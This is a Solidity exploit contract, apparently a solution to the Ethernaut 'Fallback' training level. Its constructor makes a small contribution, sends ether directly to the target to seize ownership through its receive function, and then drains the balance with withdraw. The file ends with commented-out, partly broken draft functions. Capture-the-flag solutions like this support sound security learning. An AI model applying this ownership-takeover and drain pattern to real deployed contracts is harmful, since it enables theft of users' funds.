// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../../contracts/contracts/levels/Fallback.sol';
import 'hardhat/console.sol';

contract Exploit {
    Fallback public target;

    constructor (Fallback _fallback) payable{
        require(msg.value >= 1 ether, "not enough ether");
        uint256 amount = 0.0001 ether;
        target = _fallback;
        target.contribute{value:amount}(); //call contribute with 0.0001 eth
        require(amount == target.getContribution(), "contribution not match");

        //change owner by call receive function
        (bool sent, ) = address(target).call{value:amount}("");
        require(sent, "fail to sent");
        require(address(this) == target.owner(), "unexpected target owner");

        //withdraw all
        target.withdraw();

        //check pass criteria
        require(address(target).balance == 0 , "some ethers left");
        console.log("target's owner:%s", target.owner());
        console.log("target's balance", address(target).balance);
    }

    //   constructor (Fallback _fallback) payable{
    //     uint256 amount = 0.0001 ether;
    //     target = _fallback;
        // target.contribute{value:amount}(); //call contribute with 0.0001 eth
        // require(amount == target.getContribution(), "contribution not match");

        // //change owner by call receive function
        // (bool sent, ) = address(target).call{value:amount}("");
        // require(sent, "fail to sent");
        // require(address(this) == target.owner(), "unexpected target owner");

        // //withdraw all
        // target.withdraw();

        // //check
        // require(address(target).balance == 0, "some ethers left");
    //}

    // function contribute () public payable{
    //     uint256 amount = 0.0001 ether;
    //     target.contribute{value:amount}(); //call contribute with 0.0001 eth
    //     require(amount == target.getContribution(), "contribution not match");
    // }

    // function send () payable{
    //     (bool sent, ) = address(target).call{value:amount}("");
    //     require(sent, "fail to sent");
    //     require(address(this) == target.owner(), "unexpected target owner");
    // }

    // function withdraw () {
    //     (bool sent, ) = address(target).call{value:amount}("");
    //     require(sent, "fail to sent");
    //     require(address(this) == target.owner(), "unexpected target owner");
    // }


}
